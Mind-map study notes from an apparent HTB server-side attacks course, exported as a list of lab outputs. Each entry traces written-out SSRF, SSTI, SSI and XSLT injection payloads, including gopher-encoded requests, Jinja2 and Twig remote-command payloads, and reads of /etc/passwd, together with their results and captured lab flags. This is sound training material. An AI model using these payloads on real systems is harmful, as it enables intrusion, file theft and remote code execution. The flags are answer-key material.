---
tags: [CWES, XMind, output, xmind-output]
source_file: CWES.xmind
source_sheet: "2"
module: "Server-side Attacks"
output_topics: 48
---

# Server-side Attacks — XMind Outputs

> [!info] Yellow XMind topic semantics
> The author uses yellow topics to represent **outputs**. Every entry below corresponds to one yellow source topic and retains its XMind topic ID in a hidden validation marker.

## Outputs

> [!output]+ 🟨 Output 001
> GET /ssrf HTTP/1.1
> Host: 172.17.0.10:8000
> Accept: */*
>
> **Source path:** Server-side Attacks → Server-Side Request Forgery - SSRF → Identifying SSRF → functionality to schedule appointments → put our listener → dateserver=http://172.16.0.10:8000/ssrf → GET /ssrf HTTP/1.1 Host: 172.17.0.10:8000 Accept: */*
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 51f5cf02-6c23-4173-a758-cbf6e1a1b3c3 -->

> [!output]+ 🟨 Output 002
> &lt;title&gt;
> DefendTech Innovations
> &lt;/ title&gt;
> &lt;/head&gt;
>
> **Source path:** Server-side Attacks → Server-Side Request Forgery - SSRF → Identifying SSRF → functionality to schedule appointments → determine whether the HTTP response reflects the SSRF → point the web application to itself → dateserver=http://127.0.0.1/index.php → &lt;title&gt; DefendTech Innovations &lt;/ title&gt; &lt;/head&gt;
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 9fb46912-e900-46d7-adc3-da4133549622 -->

> [!output]+ 🟨 Output 003
> Failed to connect to port 81
>
> **Source path:** Server-side Attacks → Server-Side Request Forgery - SSRF → Identifying SSRF → functionality to schedule appointments → Enumerating the System → conduct a port scan → dateserver=http://127.0.0.1:81 → Failed to connect to port 81
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: c520962c-eba1-401b-a5a2-52c97b01081c -->

> [!output]+ 🟨 Output 004
> 80
>
> **Source path:** Server-side Attacks → Server-Side Request Forgery - SSRF → Identifying SSRF → functionality to schedule appointments → Enumerating the System → conduct a port scan → We can do this using a fuzzer like ffuf → ffuf -w ./ports.txt -u http://172.17.0.2/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "dateserver=http://127.0.0.1:FUZZ/&amp;date=2024-01-01" -fr "Failed to connect to" → 80
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: a634049e-cd0e-4d9a-ba24-27659c4193c0 -->

> [!output]+ 🟨 Output 005
> 3306
>
> **Source path:** Server-side Attacks → Server-Side Request Forgery - SSRF → Identifying SSRF → functionality to schedule appointments → Enumerating the System → conduct a port scan → We can do this using a fuzzer like ffuf → ffuf -w ./ports.txt -u http://172.17.0.2/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "dateserver=http://127.0.0.1:FUZZ/&amp;date=2024-01-01" -fr "Failed to connect to" → 3306
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 742e67b4-4785-4862-bec4-049f2ff193ef -->

> [!output]+ 🟨 Output 006
> 80
>
> **Source path:** Server-side Attacks → Server-Side Request Forgery - SSRF → Identifying SSRF → LAB → Exploit a SSRF vulnerability to identify an internal web application. Access the internal application to obtain the flag. → ffuf -u http://10.129.201.127 -w ports.txt -X POST -d 'dateserver=http://127.0.0.1:FUZZ&amp;date=2024-01-01' -H 'Content-Type: application/x-www-form-urlencoded'  -fr "Failed to connect to" → 80
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 523bc6dd-2d5c-4415-b8ef-38448b62be85 -->

> [!output]+ 🟨 Output 007
> 3306
>
> **Source path:** Server-side Attacks → Server-Side Request Forgery - SSRF → Identifying SSRF → LAB → Exploit a SSRF vulnerability to identify an internal web application. Access the internal application to obtain the flag. → ffuf -u http://10.129.201.127 -w ports.txt -X POST -d 'dateserver=http://127.0.0.1:FUZZ&amp;date=2024-01-01' -H 'Content-Type: application/x-www-form-urlencoded'  -fr "Failed to connect to" → 3306
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 507bbc8f-88aa-4078-8cc8-ce4352d5716e -->

> [!output]+ 🟨 Output 008
> 8000
>
> **Source path:** Server-side Attacks → Server-Side Request Forgery - SSRF → Identifying SSRF → LAB → Exploit a SSRF vulnerability to identify an internal web application. Access the internal application to obtain the flag. → ffuf -u http://10.129.201.127 -w ports.txt -X POST -d 'dateserver=http://127.0.0.1:FUZZ&amp;date=2024-01-01' -H 'Content-Type: application/x-www-form-urlencoded'  -fr "Failed to connect to" → 8000
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 34796afb-09dc-4d0f-908d-38b2b277dfcd -->

> [!output]+ 🟨 Output 009
> HTB{911fc5badf7d65aed95380d536c270f8}
>
> **Source path:** Server-side Attacks → Server-Side Request Forgery - SSRF → Identifying SSRF → LAB → Exploit a SSRF vulnerability to identify an internal web application. Access the internal application to obtain the flag. → in the same Post request → dateserver=http://127.0.0.1:8000&amp;date=2024-01-01 → HTB{911fc5badf7d65aed95380d536c270f8}
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: c86a777a-d494-43ff-a74c-18475a53aee0 -->

> [!output]+ 🟨 Output 010
> admin
>
> **Source path:** Server-side Attacks → Server-Side Request Forgery - SSRF → Exploiting SSRF → directory brute-force → ffuf → ffuf -w /opt/SecLists/Discovery/Web-Content/raft-small-words.txt -u http://172.17.0.2/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "dateserver=http://dateserver.htb/FUZZ.php&amp;date=2024-01-01" -fr "Server at dateserver.htb Port 80" → admin
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: a9fa4837-5082-4fcc-804e-9abdcb3103b4 -->

> [!output]+ 🟨 Output 011
> availability
>
> **Source path:** Server-side Attacks → Server-Side Request Forgery - SSRF → Exploiting SSRF → directory brute-force → ffuf → ffuf -w /opt/SecLists/Discovery/Web-Content/raft-small-words.txt -u http://172.17.0.2/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "dateserver=http://dateserver.htb/FUZZ.php&amp;date=2024-01-01" -fr "Server at dateserver.htb Port 80" → availability
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 9279ebc7-5f81-426b-8897-f118d46badbb -->

> [!output]+ 🟨 Output 012
> &lt;h1&gt;
> Admin Dashboard
> &lt;/h1&gt;
>
> **Source path:** Server-side Attacks → Server-Side Request Forgery - SSRF → Exploiting SSRF → The gopher Protocol → try common weak passwords, such as admin → send the following POST → POST /admin.php HTTP/1.1  Host: dateserver.htb  Content-Length: 13  Content-Type: application/x-www-form-urlencoded    adminpw=admin → We need to URL-encode all special characters to construct a valid gopher URL → gopher://dateserver.htb:80/_POST%20/admin.php%20HTTP%2F1.1%0D%0AHost:%20dateserver.htb%0D%0AContent-Length:%2013%0D%0AContent-Type:%20application/x-www-form-urlencoded%0D%0A%0D%0Aadminpw%3Dadmin → HTTP POST → POST /index.php HTTP/1.1  Host: 172.17.0.2  Content-Length: 265  Content-Type: application/x-www-form-urlencoded    dateserver=gopher%3a//dateserver.htb%3a80/_POST%2520/admin.php%2520HTTP%252F1.1%250D%250AHost%3a%2520dateserver.htb%250D%250AContent-Length%3a%252013%250D%250AContent-Type%3a%2520application/x-www-form-urlencoded%250D%250A%250D%250Aadminpw%253Dadmin&amp;date=2024-01-01 → &lt;h1&gt; Admin Dashboard &lt;/h1&gt;
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: c6fe265e-1ba1-4b31-80f3-0fbb961c8fa8 -->

> [!output]+ 🟨 Output 013
> gopher://127.0.0.1:25/_MAIL%20FROM:attacker%40academy.htb...
>
> **Source path:** Server-side Attacks → Server-Side Request Forgery - SSRF → Exploiting SSRF → The gopher Protocol → utilize the tool Gopherus to generate gopher URLs for us → https://github.com/tarunkant/Gopherus → MySQL  PostgreSQL  FastCGI  Redis  SMTP  Zabbix  pymemcache  rbmemcache  phpmemcache  dmpmemcache → python2.7 gopherus.py --exploit smtp → Your gopher link is ready to send Mail: → gopher://127.0.0.1:25/_MAIL%20FROM:attacker%40academy.htb...
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 08b98fdc-8dca-41da-8dbb-6291dee19cde -->

> [!output]+ 🟨 Output 014
> 404 Not Found
>
> **Source path:** Server-side Attacks → Server-Side Request Forgery - SSRF → Exploiting SSRF → LAB → visit non existing page → dateserver=http://dateserver.htb/img.php&amp;date=2024-01-01 → 404 Not Found
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: b841d5fd-fe2b-416e-8fab-71863a3e5fe1 -->

> [!output]+ 🟨 Output 015
> admin
>
> **Source path:** Server-side Attacks → Server-Side Request Forgery - SSRF → Exploiting SSRF → LAB → Directory Brute force → ffuf -u http://10.129.201.127 -w /opt/useful/seclists/Discovery/Web-Content/raft-small-words.txt -X POST -d 'dateserver=http://dateserver.htb/FUZZ.php&amp;date=2024-01-01' -H 'Content-Type: application/x-www-form-urlencoded'  -fr "404 Not Found" → admin
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 2ff3a972-404e-47a4-9f3a-cb94a226592b -->

> [!output]+ 🟨 Output 016
> HTB{61ea58507c2b9da30465b9582d6782a1}
>
> **Source path:** Server-side Attacks → Server-Side Request Forgery - SSRF → Exploiting SSRF → LAB → visit /admin.php → dateserver=http://dateserver.htb/admin.php&amp;date=2024-01-01 → HTB{61ea58507c2b9da30465b9582d6782a1}
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: fdbea30c-ba31-44d1-a0d0-b9d7a973c206 -->

> [!output]+ 🟨 Output 017
> Something went wrong!
>
> **Source path:** Server-side Attacks → Server-Side Request Forgery - SSRF → Blind SSRF → Identifying Blind SSRF → Exploiting → if port not working → dateserver=http://127.0.0.1:81/&amp;date=2024-01-01 → Something went wrong!
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 94f8f5c9-732b-4709-a2f2-51822ee00d1d -->

> [!output]+ 🟨 Output 018
> Date is Unavailable
>
> **Source path:** Server-side Attacks → Server-Side Request Forgery - SSRF → Blind SSRF → Identifying Blind SSRF → Exploiting → if port is working → dateserver=http://127.0.0.1:8000/&amp;date=2024-01-01 → Date is Unavailable
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 6f8a2335-a24d-4815-9f9b-a55049855d4c -->

> [!output]+ 🟨 Output 019
> Date is Unavailable
>
> **Source path:** Server-side Attacks → Server-Side Request Forgery - SSRF → Blind SSRF → Identifying Blind SSRF → Exploiting → if file exist → dateserver=file:///etc/passwd/&amp;date=2024-01-01 → Date is Unavailable
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 1fdde951-6ab9-4394-9bba-1382b85aab16 -->

> [!output]+ 🟨 Output 020
> Hi Rayan
>
> **Source path:** Server-side Attacks → Server-side Template Injection - SSTI → Identifying SSTI → similar to the process of identifying any other injection vulnerability, such as SQL injection → most effective way is to inject special characters → Rayan → Hi Rayan
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 056ccc26-76df-4474-9a81-417ef8a64152 -->

> [!output]+ 🟨 Output 021
> Hi ${7*7}!
>
> **Source path:** Server-side Attacks → Server-side Template Injection - SSTI → Identifying the Template Engine → start by injecting the payload ${7*7} → Hi ${7*7}!
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 52901e56-a476-4d06-a285-36a53a23101d -->

> [!output]+ 🟨 Output 022
> Hi 49
>
> **Source path:** Server-side Attacks → Server-side Template Injection - SSTI → Identifying the Template Engine → start by injecting the payload ${7*7} → Hi ${7*7}! → Since the injected payload was not executed, we follow the red arrow and now inject the payload {{7*7}} → Hi 49
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 9207c1af-253a-41bc-b09d-de66c6863c17 -->

> [!output]+ 🟨 Output 023
> Hi 7777777
>
> **Source path:** Server-side Attacks → Server-side Template Injection - SSTI → Identifying the Template Engine → start by injecting the payload ${7*7} → Hi ${7*7}! → Since the injected payload was not executed, we follow the red arrow and now inject the payload {{7*7}} → Hi 49 → follow the green arrow and inject the payload {{7*'7'}} → Jinja → Hi 7777777
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 30cfaf9b-6f21-47e7-93b0-522e33f45bc9 -->

> [!output]+ 🟨 Output 024
> Hi 49
>
> **Source path:** Server-side Attacks → Server-side Template Injection - SSTI → Identifying the Template Engine → start by injecting the payload ${7*7} → Hi ${7*7}! → Since the injected payload was not executed, we follow the red arrow and now inject the payload {{7*7}} → Hi 49 → follow the green arrow and inject the payload {{7*'7'}} → Twig → Hi 49
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 7e4c835d-8e24-4f28-9049-745a97b2601b -->

> [!output]+ 🟨 Output 025
> Hi Rayan!
>
> **Source path:** Server-side Attacks → Server-side Template Injection - SSTI → Identifying the Template Engine → SSTI identify LAB → Apply what you learned in this section and identify the Template Engine used by the web application. Provide the name of the template engine as the answer. → enter Rayan in the input field → Hi Rayan!
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 713d597e-4ae1-45da-915a-ae7aee255b1f -->

> [!output]+ 🟨 Output 026
> Hi 49
>
> **Source path:** Server-side Attacks → Server-side Template Injection - SSTI → Identifying the Template Engine → SSTI identify LAB → Apply what you learned in this section and identify the Template Engine used by the web application. Provide the name of the template engine as the answer. → enter Rayan in the input field → Hi Rayan! → Enter ${7*7} → didnt executed try {{7*7}} → executed now determine is it Twig or Jinja by using {{7*'7'}} → Hi 49
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 8d5e1245-3c2c-4483-86b3-808bdad6dd80 -->

> [!output]+ 🟨 Output 027
> ..secret_key=...
>
> **Source path:** Server-side Attacks → Server-side Template Injection - SSTI → Exploiting SSTI - Jinja2 → Information Disclosure → configuration details → {{ config.items() }} → ..secret_key=...
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 1bf45172-1a26-4fa5-b04a-e6a19b80d6ac -->

> [!output]+ 🟨 Output 028
> Hi uid=0(root)...
>
> **Source path:** Server-side Attacks → Server-side Template Injection - SSTI → Exploiting SSTI - Jinja2 → Information Disclosure → configuration details → {{ config.items() }} → ..secret_key=... → prepare further attacks using the obtained information → dump all available built-in functions → {{ self.__init__.__globals__.__builtins__ }} → Remote Code Execution (RCE) → {{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }} → Hi uid=0(root)...
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: fca20864-8cfd-4b63-a77e-67b36ee6d15f -->

> [!output]+ 🟨 Output 029
> &lt;div&gt;
> Hi HTB{295649e25b4d852185ba34907ec80643}!&lt;br/&gt;&lt;br/&gt;Your IP: 10.30.18.167&lt;br/&gt;&lt;br/&gt;Current Time: 2026-01-16 18:37:43&lt;br/&gt;&lt;br/&gt;
> &lt;/div&gt;
>
> **Source path:** Server-side Attacks → Server-side Template Injection - SSTI → Exploiting SSTI - Jinja2 → Exploit Jinja - LAB → Burp Repeater → GET /?name={{+self.__init__.__globals__.__builtins__.__import__('os').popen('ls').read()+}} → GET /?name={{+self.__init__.__globals__.__builtins__.__import__('os').popen('cat+flag.txt').read()+}} → &lt;div&gt; Hi HTB{295649e25b4d852185ba34907ec80643}!&lt;br/&gt;&lt;br/&gt;Your IP: 10.30.18.167&lt;br/&gt;&lt;br/&gt;Current Time: 2026-01-16 18:37:43&lt;br/&gt;&lt;br/&gt; &lt;/div&gt;
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 9b46cbfa-6d25-4159-a954-a173d8ae364e -->

> [!output]+ 🟨 Output 030
> [+] File downloaded correctly
>
> **Source path:** Server-side Attacks → Server-side Template Injection - SSTI → Tools of the Trade → more modern → https://github.com/vladko312/SSTImap → git clone https://github.com/vladko312/SSTImap → pip3 install -r requirements.txt → python3 sstimap.py -u http://172.17.0.2/index.php?name=test → download a remote file → python3 sstimap.py -u http://172.17.0.2/index.php?name=test -D '/etc/passwd' './passwd' → [+] File downloaded correctly
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 3c091b9f-8c56-4413-a218-d3c6ee4363d9 -->

> [!output]+ 🟨 Output 031
> uid=33(www-data) gid=33(www-data) groups=33(www-data)
>
> **Source path:** Server-side Attacks → Server-side Template Injection - SSTI → Tools of the Trade → more modern → https://github.com/vladko312/SSTImap → git clone https://github.com/vladko312/SSTImap → pip3 install -r requirements.txt → python3 sstimap.py -u http://172.17.0.2/index.php?name=test → execute a system command → python3 sstimap.py -u http://172.17.0.2/index.php?name=test -S id → uid=33(www-data) gid=33(www-data) groups=33(www-data)
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: d57d4713-2690-4851-a458-1b904793ce96 -->

> [!output]+ 🟨 Output 032
> www-data
>
> **Source path:** Server-side Attacks → Server-side Template Injection - SSTI → Tools of the Trade → more modern → https://github.com/vladko312/SSTImap → git clone https://github.com/vladko312/SSTImap → pip3 install -r requirements.txt → python3 sstimap.py -u http://172.17.0.2/index.php?name=test → interactive shell → python3 sstimap.py -u http://172.17.0.2/index.php?name=test --os-shell → Linux$ whoami → www-data
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 2800f81f-e905-4a04-a102-5877d7f5e83d -->

> [!output]+ 🟨 Output 033
> Hi Rayan!
>
> **Source path:** Server-side Attacks → Server-Side Includes - SSI → Exploiting SSI Injection → enter our name → we are redirected to /page.shtml → Hi Rayan!
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 77868e54-4aa5-431f-8e54-ec2be32d1f28 -->

> [!output]+ 🟨 Output 034
> HTB{81e5d8e80eec8e961a31229e4a5e737e}
>
> **Source path:** Server-side Attacks → Server-Side Includes - SSI → Exploiting SSI Injection → execute arbitrary commands using the exec → &lt;!--#exec cmd="cat /flag.txt" --&gt; → HTB{81e5d8e80eec8e961a31229e4a5e737e}
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: a3b62d5e-6220-451d-ac4e-b0268cde3b77 -->

> [!output]+ 🟨 Output 035
> Hi Version 1.0
> vendor: libxslt ...
>
> **Source path:** Server-side Attacks → eXtensible Stylesheet Language Transformation (XSLT) → Exploiting XSLT Injection → Information Disclosure → We can try to infer some basic information about the XSLT processor in use by injecting → Version: &lt;xsl:value-of select="system-property('xsl:version')" /&gt;  &lt;br/&gt;  Vendor: &lt;xsl:value-of select="system-property('xsl:vendor')" /&gt;  &lt;br/&gt;  Vendor URL: &lt;xsl:value-of select="system-property('xsl:vendor-url')" /&gt;  &lt;br/&gt;  Product Name: &lt;xsl:value-of select="system-property('xsl:product-name')" /&gt;  &lt;br/&gt;  Product Version: &lt;xsl:value-of select="system-property('xsl:product-version')" /&gt; → Hi Version 1.0 vendor: libxslt ...
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 86336561-8314-4f22-9071-148b32b3897f -->

> [!output]+ 🟨 Output 036
> Hi root:x:0...
>
> **Source path:** Server-side Attacks → eXtensible Stylesheet Language Transformation (XSLT) → Exploiting XSLT Injection → Local File Inclusion (LFI) → if the XSLT library is configured to support PHP functions → call the PHP function file_get_contents → &lt;xsl:value-of select="php:function('file_get_contents','/etc/passwd')" /&gt; → Hi root:x:0...
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 425bba54-7e74-4db5-8620-356a069d4929 -->

> [!output]+ 🟨 Output 037
> Hi HTB{3a4fe85c1f1e2b61cabe9836a150f892},...
>
> **Source path:** Server-side Attacks → eXtensible Stylesheet Language Transformation (XSLT) → Exploiting XSLT Injection → Remote Code Execution (RCE) → If an XSLT processor supports PHP functions, we can call a PHP function that executes a local system command → &lt;xsl:value-of select="php:function('system','id')" /&gt; → &lt;xsl:value-of select="php:function('system','cat /flag.txt')" /&gt; → Hi HTB{3a4fe85c1f1e2b61cabe9836a150f892},...
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 9565ea4a-b3f9-4740-bbac-c67e60523d56 -->

> [!output]+ 🟨 Output 038
> {"id": "FusionExpress01", "location": "321 Maple Lane"}
>
> **Source path:** Server-side Attacks → Skills Assessment → vist / → API Request → POST / HTTP/1.1 Host: 94.237.63.174:33800 Connection: keep-alive  api=http://truckapi.htb/?id%3DFusionExpress01 → {"id": "FusionExpress01", "location": "321 Maple Lane"}
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: d716ff7a-026d-426a-9b2e-ab9d06d1daa1 -->

> [!output]+ 🟨 Output 039
> Error (1): Protocol "gopher" not supported or disabled in libcurl
>
> **Source path:** Server-side Attacks → Skills Assessment → vist / → use diffrent protocols schemes → api=gopher://127.0.0.1:25/ → Error (1): Protocol "gopher" not supported or disabled in libcurl
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 6131492f-fe71-4424-9850-a28fef8341b0 -->

> [!output]+ 🟨 Output 040
> Error (1): Protocol "file" not supported or disabled in libcurl
>
> **Source path:** Server-side Attacks → Skills Assessment → vist / → use diffrent protocols schemes → api=file:///etc/passwd → Error (1): Protocol "file" not supported or disabled in libcurl
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: af4b3312-b462-44a2-a9ec-1a342e4bd2bc -->

> [!output]+ 🟨 Output 041
> 80
> 3306
>
> **Source path:** Server-side Attacks → Skills Assessment → vist / → Port scan → ffuf -u http://94.237.63.174:33800/ -w ports.txt -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "api=http://truckapi.htb:FUZZ/" -fr "Failed to connect to truckapi.htb" → 80 3306
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 4f27fbd7-514c-46ce-ac52-5030bf2a661f -->

> [!output]+ 🟨 Output 042
> vendor
>
> **Source path:** Server-side Attacks → Skills Assessment → vist / → Directory brute forcing → ffuf -u http://94.237.63.174:33800/ -w /opt/useful/seclists/Discovery/Web-Content/raft-small-words.txt -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "api=http://truckapi.htb/FUZZ" -fr '404 Not Found' -e .php -fs 277 → vendor
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 25629645-d8f4-4f5e-a740-cad6ef607c44 -->

> [!output]+ 🟨 Output 043
> autoload.php
> symfony
> twig
> composer
>
> **Source path:** Server-side Attacks → Skills Assessment → vist / → Directory brute forcing → ffuf -u http://94.237.63.174:33800/ -w /opt/useful/seclists/Discovery/Web-Content/raft-small-words.txt -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "api=http://truckapi.htb/FUZZ" -fr '404 Not Found' -e .php -fs 277 → vendor → ffuf -u http://94.237.63.174:33800/ -w /opt/useful/seclists/Discovery/Web-Content/raft-small-words.txt -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "api=http://truckapi.htb/vendor/FUZZ" -fr '404 Not Found' -e .php -fs 277 → autoload.php symfony twig composer
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 4219eff8-a5ec-4a2b-9a61-ef740bff3576 -->

> [!output]+ 🟨 Output 044
> {"id": "${7*7}", "location": "134 Main Street"}
>
> **Source path:** Server-side Attacks → Skills Assessment → vist / → return to the main API request and play with it → replace FusionExpress01 → api=http://truckapi.htb/?id%3D${7*7} → {"id": "${7*7}", "location": "134 Main Street"}
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 8b66959a-f8d9-4671-a645-e45303b10f85 -->

> [!output]+ 🟨 Output 045
> {"id": "49", "location": "134 Main Street"}
>
> **Source path:** Server-side Attacks → Skills Assessment → vist / → return to the main API request and play with it → replace FusionExpress01 → api=http://truckapi.htb/?id%3D${7*7} → {"id": "${7*7}", "location": "134 Main Street"} → api=http://truckapi.htb/?id%3D{{7*7}} → {"id": "49", "location": "134 Main Street"}
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 0e3e11c7-1811-403d-aa61-fb8dda8b6b90 -->

> [!output]+ 🟨 Output 046
> Error (3): URL using bad/illegal format or missing URL
>
> **Source path:** Server-side Attacks → Skills Assessment → vist / → get RCE → api=http://truckapi.htb/?id%3D{{+['id']+|+filter('system')+}} → Error (3): URL using bad/illegal format or missing URL
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 59dd3443-d3d5-4750-a3c5-5f0015567b63 -->

> [!output]+ 🟨 Output 047
> {"id": "uid=33(www-data) gid=33(www-data) groups=33(www-data)
> Array", "location": "134 Main Street"}
>
> **Source path:** Server-side Attacks → Skills Assessment → vist / → get RCE → api=http://truckapi.htb/?id%3D{{+['id']+|+filter('system')+}} → Error (3): URL using bad/illegal format or missing URL → just remove the spaces → api=http://truckapi.htb/?id%3D{{['id']|filter('system')}} → {"id": "uid=33(www-data) gid=33(www-data) groups=33(www-data) Array", "location": "134 Main Street"}
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 2de80dc0-1ced-4a33-b94c-d81fe304c2ec -->

> [!output]+ 🟨 Output 048
> {"id": "HTB{3b8e2b940775e0267ce39d7c80488fc8}Array", "location": "134 Main Street"}
>
> **Source path:** Server-side Attacks → Skills Assessment → vist / → get RCE → api=http://truckapi.htb/?id%3D{{+['id']+|+filter('system')+}} → Error (3): URL using bad/illegal format or missing URL → just remove the spaces → api=http://truckapi.htb/?id%3D{{['id']|filter('system')}} → {"id": "uid=33(www-data) gid=33(www-data) groups=33(www-data) Array", "location": "134 Main Street"} → space is blacklisted even %20 and %09 → use $IFS to work as space → api=http://truckapi.htb/?id%3D{{['cat$IFS/flag.txt']|filter('system')}} → {"id": "HTB{3b8e2b940775e0267ce39d7c80488fc8}Array", "location": "134 Main Street"}
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: f9edccd9-bfd0-4182-80f5-1574a154b5e7 -->
